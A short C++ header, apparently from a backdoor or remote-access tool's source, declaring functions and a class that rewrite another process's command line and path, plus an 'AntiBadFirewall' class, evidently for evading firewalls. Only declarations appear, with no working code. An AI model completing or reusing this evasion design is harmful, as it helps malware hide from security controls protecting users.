#if !defined _SPOOFPROCPATH

#define _SPOOFPROCPATH

#include "..\zxsCommon\zxsWinAPI.h"
#include "..\zxsCommon\CommandLineToArgvA.h"
#include "..\zxsCommon\RegEdit.h"

BOOL ModifyCmdLine(DWORD dwPId, char *szData);
BOOL ModifyProcPath(DWORD dwPId, char *szData);

class CSpoofProcPath
{
protected:
	char oldPath[MAX_PATH];
	char newPath[MAX_PATH];
	DWORD m_Pid;

public:

	CSpoofProcPath();
	~CSpoofProcPath();

	BOOL Modify();
	BOOL Restore();

	void SetProcessId(DWORD pid){ m_Pid = pid; };
	void SetOldPath(char *lpPath){ strcpy(oldPath, lpPath); };
	void SetNewPath(char *lpPath){ strcpy(newPath, lpPath); };

};

class AntiBadFirewall
{
protected:
	int IsOK;
	CSpoofProcPath m_spp;

public:
	AntiBadFirewall();
	~AntiBadFirewall();
};


#endif